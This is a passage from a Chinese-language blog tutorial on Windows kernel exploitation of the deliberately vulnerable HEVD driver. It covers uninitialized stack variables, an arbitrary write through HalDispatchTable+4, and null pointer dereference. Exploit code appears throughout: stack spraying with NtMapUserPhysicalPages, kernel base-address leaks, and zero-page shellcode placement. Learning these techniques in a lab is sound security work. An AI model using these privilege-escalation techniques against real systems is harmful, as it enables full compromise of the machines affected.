class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在例如函数指针没有进行初始化,此时pFunc为随机值，调用他将会产生出乎意料的结果。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"test\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">void</span> (*pFunc)();</div><div class="line">    (*pFunc)();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定位到<code>TriggerUninitializedMemoryStack</code>函数，在第五行，声明了函数指针v4，当传入的UserBuffer为特定的0xBAD0B0B0时，为v4赋值。然后对v4判空之后，调用v4，该漏洞存在于，如果传入的并不是0xBAD0B0B0，则不会对v4进行赋值，而v4也没有初始化，则导致程序出现出乎意料的结果，由此未初始化栈变量漏洞产生。<br>    <img src="http://hacky.wang/blog/20220727/QXweqQTxxSgm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看一下是如何修复的，初始化UninitializedMemory变量即可。<br>    <img src="http://hacky.wang/blog/20220727/Uu7tqsy4O0e1.png?imageslim" alt="mark"></p><h2 id="0x3-2-漏洞利用"><a href="#0x3-2-漏洞利用" class="headerlink" title="0x3.2 漏洞利用"></a>0x3.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞是由于未初始化变量产生的，也就是变量的值是一个随机值，并不是一个默认值(NULL),所以构造零页内存是不可以的。这里用到的漏洞利用技术是栈喷射。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当传入的Buffer不为0xBAD0B0B0时，不会对v4进行赋值，此时默认的v4的值为NULL。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> UninitializedMemoryStack()</div><div class="line">&#123;</div><div class="line"><span class="comment">//Step1 打开设备</span></div><div class="line">HANDLE hDevice = <span class="literal">NULL</span>;</div><div class="line">LPCSTR FileName = (LPCSTR)LINK_NAME;</div><div class="line">hDevice = GetDeviceHandle(FileName);</div><div class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hDevice)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]  GetDeviceHandle:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//栈喷射</span></div><div class="line"><span class="comment">//ULONG ShellCodeAddr = (ULONG)ShellCode;</span></div><div class="line"><span class="comment">//if (StackPengShe(ShellCodeAddr) == FALSE)</span></div><div class="line"><span class="comment">//&#123;</span></div><div class="line"><span class="comment">//printf("[!] StackPengShe Error\n");</span></div><div class="line"><span class="comment">//return FALSE;</span></div><div class="line"><span class="comment">//&#125;</span></div><div class="line"><span class="comment">//Step3 触发漏洞</span></div><div class="line">CHAR  UserBuffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">memset(UserBuffer, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(UserBuffer));</div><div class="line">ULONG uReturnlength = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (DeviceIoControl(hDevice,</div><div class="line">HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE,</div><div class="line">&amp;UserBuffer,</div><div class="line"><span class="keyword">sizeof</span>(UserBuffer),</div><div class="line"><span class="literal">NULL</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;uReturnlength,</div><div class="line"><span class="literal">NULL</span>) == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] DeviceIoControl :%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">kd&gt; <span class="built_in">bp</span> 9951d097</div><div class="line">kd&gt; g</div><div class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</div><div class="line">HEVD!TriggerUninitializedMemoryStack+<span class="number">0x9d</span>:</div><div class="line">9951d097 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">kd&gt; r <span class="built_in">eax</span></div><div class="line"><span class="built_in">eax</span>=<span class="number">00000000</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在查看一下kernel栈，如下。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">kd&gt; dps esp</div><div class="line"><span class="number">94237</span>ab4  <span class="number">387</span>f514e</div><div class="line"><span class="number">94237</span>ab8  <span class="number">85</span>f99398</div><div class="line"><span class="number">94237</span>abc  <span class="number">83</span>f0b675 nt!DbgPrintEx</div><div class="line"><span class="number">94237</span>ac0  <span class="number">85</span>f99408</div><div class="line"><span class="number">94237</span>ac4  <span class="number">83</span>eb2361 nt!KeUpdateRunTime+<span class="number">0x164</span></div><div class="line"><span class="number">94237</span>ac8  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>acc  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>ad0  <span class="number">00008</span>eb0</div><div class="line"><span class="number">94237</span>ad4  <span class="number">66</span>b499f8</div><div class="line"><span class="number">94237</span>ad8  <span class="number">000067</span>f6</div><div class="line"><span class="number">94237</span>adc  <span class="number">00006700</span></div><div class="line"><span class="number">94237</span>ae0  <span class="number">94237</span>b60</div><div class="line"><span class="number">94237</span>ae4  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>ae8  <span class="number">8713</span>fc60</div><div class="line"><span class="number">94237</span>aec  <span class="number">87</span>d5e460</div><div class="line"><span class="number">94237</span>af0  <span class="number">83</span>f70c00 nt!KiInitialPCR</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当启用栈喷射，内核堆栈效果如下。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">kd&gt; dps esp</div><div class="line"><span class="number">8</span>f3daab4  <span class="number">2361814</span>e</div><div class="line"><span class="number">8</span>f3daab8  <span class="number">881925</span>a8</div><div class="line"><span class="number">8</span>f3daabc  <span class="number">83</span>f0b675 nt!DbgPrintEx</div><div class="line"><span class="number">8</span>f3daac0  <span class="number">88192618</span></div><div class="line"><span class="number">8</span>f3daac4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daac8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daacc  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daadc  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaec  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daafc  <span class="number">00941170</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈喷射实现是利用NtMapUserPhysicalPages，设置我们构造好的数据，从而填充内核堆栈。NtMapUserPhysicalPages接收的长度为1024，填充的ShellcodeAddr大小为4，所以需要开辟1024 * 4的空间。这都算是定式，记住即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//栈喷射</span></div><div class="line"><span class="function">BOOL  <span class="title">StackPengShe</span><span class="params">(ULONG ShellcodeAddr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">NTSTATUS ntStatus = <span class="number">0</span>;</div><div class="line"><span class="comment">//NtMapUserPhysicalPages</span></div><div class="line">pfnNtMapUserPhysicalPages NtMapUserPhysicalPages = (pfnNtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtMapUserPhysicalPages"</span>);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == NtMapUserPhysicalPages)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] Get Address NtMapUserPhysicalPages Error\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="comment">//NtMapUserPhysicalPages 接受的最大长度为1024</span></div><div class="line">PDWORD StackSpray = (PDWORD)<span class="built_in">malloc</span>(<span class="number">1024</span> * <span class="number">4</span>);</div><div class="line"><span class="built_in">memset</span>(StackSpray, <span class="string">'A'</span>, <span class="number">1024</span> * <span class="number">4</span>);</div><div class="line"><span class="comment">//填充ShellcodeAddr</span></div><div class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</div><div class="line">&#123;</div><div class="line"><span class="comment">//*(PDWORD)((DWORD)StackSpray + i) = (DWORD)&amp;ShellcodeAddr;</span></div><div class="line">StackSpray[i] = ShellcodeAddr;</div><div class="line">&#125;</div><div class="line"><span class="comment">//R3影响R0</span></div><div class="line">ntStatus = NtMapUserPhysicalPages(<span class="literal">NULL</span>, <span class="number">1024</span>, StackSpray);</div><div class="line"><span class="comment">//return ntStatus == 0 ? TRUE : FALSE;</span></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="0x4-任意地址覆盖"><a href="#0x4-任意地址覆盖" class="headerlink" title="0x4 任意地址覆盖"></a>0x4 任意地址覆盖</h1><h2 id="0x4-1-成因分析"><a href="#0x4-1-成因分析" class="headerlink" title="0x4.1 成因分析"></a>0x4.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任意地址覆盖，指的是代码没有验证地址是否有效直接使用。通过构造payload，将用来提权的Shellcode的地址覆盖到可以导致内核代码执行的区域从而实现提权。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞位于HEVD控制码为0x22200B的函数<code>sub_444BCE</code>处,在<code>sub_444BCE</code>函数中，将R3传来的缓冲区传入了<code>sub_444BEE</code>,乍一看，很难发现这段代码有什么问题，就是单纯的将What成员复制给了Where成员，但是在内核中，没有针对地址的有效性进行验证，直接使用的话，这是非常危险的。<br>    <img src="http://hacky.wang/blog/20220720/gglXAaml6Ltv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，漏洞版本就是没有对地址进行检查，而修复的版本，可以看到对需要读取的地址，使用ProbeForRead和ProbeForWrite进行了检查，ProbeForRead和ProbeForWrite的作用就是检查用户模式缓冲区是否位于用户态，并验证对齐。<br>    <img src="http://hacky.wang/blog/20220720/EmKALOaM0m6g.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在学习这个漏洞的时候，我一直想不明白，就光一个内存写入怎么就触发漏洞了，后来其实才明白原理，其实内存写入这个动作并不会触发漏洞，关键是写入的这个地址(也就是代码里面的What)才是危险的，我们可以这样构造，首先What这个地方存储的是ShellCode的地址，然后在找一个地方，只要可以执行就好了，因为通过这个任意地址覆盖，将Shellcode的地址覆盖到那个可以执行的地址上，那么通过触发，就可以执行Shellcode了。而<code>HalDispatchTable+0x4</code>就是这样一个地址。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何定位<code>HalDispatchTable+0x4</code>，首先查看一下<code>nt!NtQueryIntervalProfile</code>这个函数的反汇编，在<code>nt!NtQueryIntervalProfile+0x6B</code>调用了<code>nt!KeQueryIntervalProfile</code>,跟进<code>nt!KeQueryIntervalProfile</code>,显然在在<code>0x8410e8b4</code>调用了<code>nt!HalDispatchTable+0x4</code>这个分发表，<strong>只需要记住，shellcode往这个地方写就是了，貌似高版本的系统这个地方已经被缓解了。</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">kd&gt; u nt!NtQueryIntervalProfile+<span class="number">0x6B</span></div><div class="line">nt!NtQueryIntervalProfile+<span class="number">0x6b</span>:</div><div class="line">8414ffa6 e8e6e8fbff      <span class="keyword">call</span>    nt!KeQueryIntervalProfile (8410e891)</div><div class="line">8414ffab 84<span class="built_in">db</span>            <span class="keyword">test</span>    <span class="built_in">bl</span>,<span class="built_in">bl</span></div><div class="line">8414ffad 741b            <span class="keyword">je</span>      nt!NtQueryIntervalProfile+<span class="number">0x8f</span> (8414ffca)</div><div class="line">8414ffaf c745fc01000000  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">1</span></div><div class="line">8414ffb6 <span class="number">8906</span>            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="built_in">eax</span></div><div class="line">8414ffb8 eb07            <span class="keyword">jmp</span>     nt!NtQueryIntervalProfile+<span class="number">0x86</span> (8414ffc1)</div><div class="line">8414ffba 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8414ffbc <span class="number">40</span>              <span class="keyword">inc</span>     <span class="built_in">eax</span></div><div class="line">//======&gt;nt!KeQueryIntervalProfile</div><div class="line">kd&gt; U nt!KeQueryIntervalProfile l20</div><div class="line">nt!KeQueryIntervalProfile:</div><div class="line">8410e891 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line">8410e893 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">8410e894 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">8410e896 83ec10          <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">10h</span></div><div class="line">8410e899 83f801          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">1</span></div><div class="line">8410e89c <span class="number">7507</span>            <span class="keyword">jne</span>     nt!KeQueryIntervalProfile+<span class="number">0x14</span> (8410e8a5)</div><div class="line">8410e89e a1889afa83      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!KiProfileAlignmentFixupInterval (83fa9a88)]</div><div class="line">8410e8a3 c9              <span class="keyword">leave</span></div><div class="line">8410e8a4 c3              <span class="keyword">ret</span></div><div class="line">8410e8a5 8945f0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span></div><div class="line">8410e8a8 8d45fc          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">4</span>]</div><div class="line">8410e8ab <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8ac 8d45f0          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">10h</span>]</div><div class="line">8410e8af <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8b0 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span></div><div class="line">8410e8b2 6a01            <span class="keyword">push</span>    <span class="number">1</span></div><div class="line">8410e8b4 ff15bcf3f683    <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!HalDispatchTable+<span class="number">0x4</span> (83f6f3bc)]</div><div class="line">8410e8ba 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8410e8bc 7c0b            <span class="keyword">jl</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8be 807df400        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="number">0</span></div><div class="line">8410e8c2 <span class="number">7405</span>            <span class="keyword">je</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8c4 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]</div><div class="line">8410e8c7 c9              <span class="keyword">leave</span></div><div class="line">8410e8c8 c3              <span class="keyword">ret</span></div></pre></td></tr></table></figure></p><h2 id="0x4-2-漏洞利用"><a href="#0x4-2-漏洞利用" class="headerlink" title="0x4.2 漏洞利用"></a>0x4.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先第一步打开设备，第二歩就是获取HalDispatchTable+4地址，这个地址用来存放ShellCode。获取<code>获取HalDispatchTable+4</code>地址主要有四步，因为<code>HalDispatchTable</code>这个地址在R3是导出的，只需要获取<code>ntkrnlpa.exe</code>在R3的基地址和R0的基地址，<code>HalDispatchTable</code>在R3的地址，减去<code>ntkrnlpa.exe</code>在R3的基地址，加上R0的基地址就是<code>HalDispatchTable</code>在R0的地址。所以获取<code>HalDispatchTable</code>在R0地址只需要四步。</p><ul><li>获取<code>ntkrnlpa.exe</code>在R0基地址</li><li>通过<code>LoadLibrary</code>获取<code>ntkrnlpa.exe</code>在R3基地址</li><li>通过<code>GetProcAddress</code>获取<code>HalDispatchTable</code>在R3的地址</li><li>计算<code>HalDispatchTable</code>在R0的的地址<br>  <img src="http://hacky.wang/blog/20220720/TCkVreVYvKrV.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中如何获取<code>ntkrnlpa.exe</code>在R0的基地址呢。首先<code>EnumDeviceDrivers</code>获取所有的驱动模块基地址，然后根据基地址，调用<code>GetDeviceDriverBaseNameA</code>获取驱动名，依次比较是否是<code>ntkrnlpa.exe</code>即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function">PVOID <span class="title">GetBaseAddrOfntkrnlpaInKernel</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//遍历所有的驱动程序基地址</span></div><div class="line">LPVOID lpImageBase[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">DWORD lpcbNeeded = <span class="number">0</span>;</div><div class="line">TCHAR lpfileName[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase),&amp;lpcbNeeded);   <span class="comment">//#include&lt;Psapi.h&gt;</span></div><div class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; (lpcbNeeded / <span class="keyword">sizeof</span>(LPVOID)); i++)</div><div class="line">&#123;</div><div class="line">GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(lpfileName, <span class="string">"ntkrnlpa.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+]success to get %s\n"</span>, lpfileName);</div><div class="line"><span class="keyword">return</span> lpImageBase[i];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步，触发漏洞，将Shellcode地址作为What参数传入，然后将<code>HalDispatchTable+4</code>作为Where传入，因为任意地址覆盖，就可以将Shellcode地址覆盖到<code>HalDispatchTable+4</code>地址，然后只需要调用<code>NtQueryIntervalProfile</code>触发执行就可以了。<code>NtQueryIntervalProfile</code>第一个参数值应该可以任意数字。</p><h2 id="0x4-3-参考"><a href="#0x4-3-参考" class="headerlink" title="0x4.3 参考"></a>0x4.3 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-252506.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(3)-任意内存覆盖漏洞</a></li><li><a href="https://bbs.pediy.com/thread-270176.htm" target="_blank" rel="external">HEVD学习笔记之任意地址写入</a></li></ul><h1 id="0x5-空指针解引用"><a href="#0x5-空指针解引用" class="headerlink" title="0x5 空指针解引用"></a>0x5 空指针解引用</h1><h2 id="0x5-1-成因分析"><a href="#0x5-1-成因分析" class="headerlink" title="0x5.1 成因分析"></a>0x5.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;释放完内存并将指针清空，但如果再次对这个指针进行引用，就会触发空指针引用漏洞，值得注意的是，要区分UAF和空指针解引用的区别，即，UAF是因为释放了内存，但是指针并没有置NULL，从而导致程序出现异常，<strong>可以通过占位的方式对该漏洞进行利用。</strong>而空指针解引用是指释放了内存，同时也置空了指针，但是仍对该指针进行引用导致异常。因为对空指针进行引用，<strong>如果提前在地址为0的地方提前写入shellcode，即可对空指针解引用进行利用。</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">typedef void(* pFuncAddr)()<span class="comment">;</span></div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    printf(<span class="string">"test\n"</span>)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">int</span> main()</div><div class="line">&#123;</div><div class="line">    PDWORD <span class="function"><span class="keyword">func</span> = <span class="params">(PDWORD)</span><span class="title">malloc</span><span class="params">(<span class="number">4</span>)</span>;</span></div><div class="line">    *<span class="function"><span class="keyword">func</span> = <span class="params">(DWORD)</span><span class="title">test</span>;</span></div><div class="line">    ((pFuncAddr)*<span class="function"><span class="keyword">func</span>)<span class="params">()</span>;</span></div><div class="line">    free(<span class="function"><span class="keyword">func</span>);</span></div><div class="line">    <span class="function"><span class="keyword">func</span> = <span class="title">NULL</span>;</span></div><div class="line">    ((pFuncAddr)*<span class="function"><span class="keyword">func</span>)<span class="params">()</span>;</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在HEVD中，空指针解引用漏洞位于<code>TriggerNullPointerDereference</code>函数中，反汇编效果所示，首先在第9行，Allocate空间，然后在19行比较传入的数据是否是<code>BAD0B0B0</code>,如果是在为KernelBuffer赋值，并设置回调函数，如果不是，如33，34行所示则<code>释放内存，并将指针置空</code>。无论是否为<code>BAD0B0B0</code>都会调用KernelBuffer的回调函数，也就是使用了KernelBuffer。如果KernelBuffer指针没有置空，是不会有问题的，但如果KernelBuffer指针置空了，就会导致空指针解引用。<br>    <img src="http://hacky.wang/blog/20220725/i1iNM91vbJD8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过观察HEVD源码，发现修复之后的的逻辑是先校验了NullPointerDereference指针是否为空，然后在调用回调函数。<br>    <img src="http://hacky.wang/blog/20220725/fFW4YxQesO5c.png?images![](空指针解引用" alt="mark">lim)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="http://blog.nsfocus.net/null-pointer-vulnerability-analysis-defense/" target="_blank" rel="external">这篇文章</a>里面，也很好介绍了空指针和野指针(UAF)</p><h2 id="0x5-2-漏洞利用"><a href="#0x5-2-漏洞利用" class="headerlink" title="0x5.2 漏洞利用"></a>0x5.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前面也具体讲了如何根据空指针解引用来进行漏洞利用，因为部分exp写的还是比较复杂，详细说说，这个漏洞利用就是通过事先开辟好零页，并将shellcode事先放到回调函数的地方。也就是(Null+4)的地址。<br>    <img src="http://hacky.wang/blog/20220725/g7X2bwkpAN7f.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在观察代码逻辑，只要传入的值不是<code>BAD0B0B0</code>，就会释放之前开辟的内存，并置空指针，从而导致空指针解引用。也就是说R3传入的Buffer内部只要不是<code>BAD0B0B0</code>就可以了。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后来讲一下零页内存，空指针指向的就是零页内存，在漏洞利用过程中，我们使用<code>NtAllocateVirtualMemory</code>ntdll层API函数申请零页内存，具体实现如下。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div 